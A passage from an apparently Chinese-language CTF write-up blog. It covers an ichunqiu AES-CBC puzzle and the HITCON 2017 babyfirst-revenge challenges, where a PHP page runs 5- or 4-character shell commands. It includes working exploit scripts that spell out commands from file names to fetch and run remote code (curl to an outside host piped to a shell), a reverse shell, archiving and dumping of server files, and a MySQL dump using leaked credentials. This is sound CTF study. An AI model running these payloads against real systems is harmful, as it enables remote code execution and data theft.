class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Key</span> = <span class="string">&quot;7a57a5a743894a0e&quot;</span>;</span><br><span class="line"><span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span> = &#123;</span><br><span class="line">    <span class="attr">pad</span>: <span class="keyword">function</span>(<span class="params">data, blockSize</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> blockSizeBytes = blockSize * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = blockSizeBytes - data.<span class="property">sigBytes</span> % blockSizeBytes;</span><br><span class="line">        data.<span class="title function_">concat</span>(<span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">random</span>(nPaddingBytes - <span class="number">1</span>)).<span class="title function_">concat</span>(<span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">create</span>([nPaddingBytes &lt;&lt; <span class="number">24</span>], <span class="number">1</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">unpad</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = data.<span class="property">words</span>[(data.<span class="property">sigBytes</span> - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">2</span>] &amp; <span class="number">0xff</span>;</span><br><span class="line">        data.<span class="property">sigBytes</span> -= nPaddingBytes</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesEncrypt = <span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sendData = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(ivStr);</span><br><span class="line">    <span class="keyword">var</span> encrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(sendData, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(encrypted.<span class="property">ciphertext</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesDecrypt = <span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(ivStr);</span><br><span class="line">    <span class="keyword">var</span> decrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(data, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> decrypted.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> hint = <span class="string">&quot;SSNRTPIuHLUxqtJmq8mDDPtexRU7RTjNO34tLqz+Tpw=&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>发现是个aes-cbc,然后解密一下,但是发现iv未知,于是使用key作为iv
然后得到结果 <img src="/images/2018/08/ichunqiu-1.jpg"
alt="blacsheep" /> 然后并不知道要怎么处理了,不是很懂出题人.</p>
<h4 id="看了别人的解法">看了别人的解法</h4>
<p>https://xhyeax.github.io/2019/01/26/icq-2nd-happy-rec/
别人用的git_extractor
然后diff拿flag,diff一下发现并不知道那个js的文件是真的flag,感觉出题人真的睿智...我是懒得去猜flag了...</p>
<h2 id="hitcon2017">HITCON2017</h2>
<h3 id="babyfirst-revenge">babyfirst-revenge</h3>
<p>5字符命令执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>本来想法是通过<code>\</code>来多次执行,不过似乎并不可以,<code>exec()</code>每次必定是执行一条完整的命令而不可以分割,所以只能找其他的方法
想了很久并没有想出来,去看了别人的wp,看到的思路大概就是通过重定向写文件,通过构造文件名来执行命令,知道大概的思路之后我就又开始踩坑了.
自己构造构造了很久都是失败,要么需要6个字符,要么少了空格,并没有办法,然后看了别人的wp,复现的时候发现居然还是失败,最无语的是,使用orange的官方wp中的payload居然也没能写出<code>ls -t&gt;g</code>的命令...
不过其实这里是踩坑了,<code>exec</code>的执行和shell的执行似乎是不同的,我也不太理解为什么
先给出官方wp的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.twpython`</span></span><br><span class="line">    <span class="string">&#x27;&gt;on&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;th\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;py\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\\\&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;tw\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;e.\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;ng\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;ra\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;o\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;\ \\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # exec</span></span><br><span class="line"><span class="string">    &#x27;</span>sh _<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>sh g<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.get(&#x27;</span>http://<span class="number">52.199</span><span class="number">.204</span><span class="number">.34</span>/?reset=<span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 5 </span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;</span>http://<span class="number">52.199</span><span class="number">.204</span><span class="number">.34</span>/?cmd=<span class="string">&#x27; + quote(i) )</span></span><br><span class="line"><span class="string">    print i</span></span><br><span class="line"><span class="string">    sleep(0.2)</span></span><br></pre></td></tr></table></figure>
<p>看到这里的前面部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># generate `ls -t&gt;g` file</span><br><span class="line">&#x27;&gt;ls\\&#x27;, </span><br><span class="line">&#x27;ls&gt;_&#x27;, </span><br><span class="line">&#x27;&gt;\ \\&#x27;, </span><br><span class="line">&#x27;&gt;-t\\&#x27;, </span><br><span class="line">&#x27;&gt;\&gt;g&#x27;, </span><br><span class="line">&#x27;ls&gt;&gt;_&#x27;, </span><br></pre></td></tr></table></figure>
<p>在shell中直接执行结果是这样的 <img
src="/images/2018/08/ichunqiu-2.jpg" alt="blacsheep" />
不过当我们直接curl或者网页访问之后结果又不一样 <img
src="/images/2018/08/ichunqiu-3.jpg" alt="blacsheep" />
玄学原因,如果有知道原理的可以发邮件给我,或者加我qq或者留言都行,非常感谢
然后踩的第二个坑是shell中创建<code>s \</code>的文件和curl创建也是不一样的
这个本来有个payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">-t\</span></span><br><span class="line"><span class="language-bash">&gt;\&gt;q</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">l\</span></span><br><span class="line"><span class="language-bash">&gt;s\ \</span></span><br><span class="line"><span class="language-bash"><span class="built_in">ls</span>&gt;a</span></span><br><span class="line"><span class="meta prompt_">ls&gt;</span><span class="language-bash">&gt;a</span></span><br></pre></td></tr></table></figure>
<p>不过也是这里踩坑了失败了,本来以为要六个字符,其实5个就可以了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ curl &#x27;http://127.0.0.1?cmd=&gt;s\%20\&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回网页</span></span><br><span class="line"></span><br><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ ls</span><br><span class="line">&#x27;s \&#x27;</span><br><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ sudo su</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# &gt;s\ \</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# <span class="built_in">ls</span></span></span><br><span class="line">&#x27;s &#x27;  &#x27;s \&#x27;</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# rm ./*</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# ls</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# &gt;s\ \\</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# ls</span><br><span class="line">&#x27;s \&#x27;</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7#</span><br></pre></td></tr></table></figure>
<p>curl用到的payload进行<code>urldecode</code>后有5个字符
即<code>?cmd=&gt;s\ \</code>即可创建出<code>s(空格)</code>文件
但是shell执行需要6个字符
即<code>&gt;s\ \\</code>才能创建出<code>s(空格)</code>文件
注意到这些就可以很容易的写出<code>ls -t&gt;g</code>这种类似的命令
能够创建这个命令的话,后续只用反过来把反弹shell的命令写入即可拿到shell
不过弹shell的时候又碰到问题,执行的命令里面不可包含<code>/</code>字符,所以我们不能用传统的反弹shell,而且curl的话不可以包含路径,所以这里我搭了一个docker,然后再去访问拿到shell,这里还要注意创建的文件的名称不可以重复,否则只会创建一次,就会导致命令执行失败
给个简易exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;bash&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;curl your_ip:your_port&#x27;</span></span><br><span class="line">target=<span class="string">&#x27;117.50.3.97:8001&#x27;</span></span><br><span class="line">cmd=<span class="built_in">list</span>(cmd)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(cmd)!=<span class="number">0</span>:</span><br><span class="line">    first=cmd.pop()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmd)!=<span class="number">0</span>:</span><br><span class="line">        second=cmd.pop()</span><br><span class="line">        <span class="keyword">if</span> second <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">            cmd.append(second)</span><br><span class="line">            <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">                payload.append(<span class="string">&#x27;&gt;\\&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload.append(<span class="string">&#x27;&gt;&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res=<span class="string">&#x27;&#x27;</span>+second</span><br><span class="line">            <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">                res+=<span class="string">&#x27;\\&#x27;</span>+first</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res+=first</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;&#x27;</span> + res + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> first <span class="keyword">in</span> [<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>]:</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;\\&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload.append(<span class="string">&#x27;&gt;&#x27;</span> + first + <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload.append(<span class="string">&#x27;sh _&#x27;</span>)</span><br><span class="line">payload.append(<span class="string">&#x27;sh g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://&#x27;</span> + target + <span class="string">&#x27;/?reset=1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://&#x27;</span> + target + <span class="string">&#x27;/?cmd=&#x27;</span> + quote(i) )</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
<p>然后拿到shell <img src="/images/2018/08/ichunqiu-5.jpg"
alt="blacsheep" /> 然后在home下面找到信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Flag is in the MySQL database</span><br><span class="line">fl4444g / SugZXUtgeJ52_Bvr</span><br></pre></td></tr></table></figure>
<p>那么再去连接mysql就可以了
不过这里连接mysql是不能直接和mysql进行通信的,所以我们将和mysql交互的结果导出到文件
<img src="/images/2018/08/ichunqiu-4.jpg" alt="blacsheep" />
即拿到flag</p>
<h4 id="infosec的方法">infosec的方法</h4>
<p>这个比较厉害,不过在ichunqiu的环境复现不了,因为ichunqiu的web目录是/var/www/html/但是/www/sandbox并没有进行配置,所以我们无法获取到我们导出的文件,只能对其进行操作.不过思路确实很棒,学习一下
假设我们可以访问到文件的话,那么我们可以</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;find&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=*%20/&gt;x&#x27;</span><br></pre></td></tr></table></figure>
<p>然后即可把所有的文件导出到x,下载x查看所有文件,发现特殊文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/fl4444g/README.txt</span><br></pre></td></tr></table></figure>
<p>然后用tar命令打包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;tar&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;zcf&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;zzz&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=*%20/h*&#x27;</span><br></pre></td></tr></table></figure>
<p>这个执行了命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf zzz /h*</span><br></pre></td></tr></table></figure>
<p>下载之后同样发现flag在数据库,这里infosec师傅的方法就很厉害了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt; EOF &gt;&gt; exploit.php</span><br><span class="line">&lt;?php exec(&#x27;mysqldump --single-transaction -ufl4444g -pSugZXUtgeJ52_Bvr --all-databases &gt; /var/www/html/sandbox/727479ef7cedf30c03459bec7d87b0f0/dump.sql 2&gt;&amp;1&#x27;); ?&gt;</span><br><span class="line">EOF</span><br><span class="line">curl &#x27;http://52.199.204.34/?reset=1&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;tar&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;vcf&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=&gt;z&#x27;</span><br><span class="line">curl -F file=@exploit.php -X POST &#x27;http://52.199.204.34/?cmd=%2A%20%2Ft%2A&#x27;</span><br><span class="line">curl &#x27;http://52.199.204.34/?cmd=php%20z&#x27;</span><br></pre></td></tr></table></figure>
<p>因为传文件过去的时候,文件会存在/tmp目录下
先创建<code>tar,vcf,z</code> 然后执行<code>* /t*</code> 也就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar vcf z /t*</span><br></pre></td></tr></table></figure>
<p>拿到php文件后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php z</span><br></pre></td></tr></table></figure>
<p>即可执行命令然后去下载dump.sql即可拿到flag</p>
<h3 id="babyfirst-revenge-v2">babyfirst-revenge-v2</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这个是4字符命令执行,那么我们的<code>ls -t&gt;g</code>的构造就要另找办法了,官方wp是使用逆序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br></pre></td></tr></table></figure>
<p>这样我们用<code>*</code>之后就可以得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g&gt;  ht-  sl</span><br></pre></td></tr></table></figure>
<p>然后只用</p>
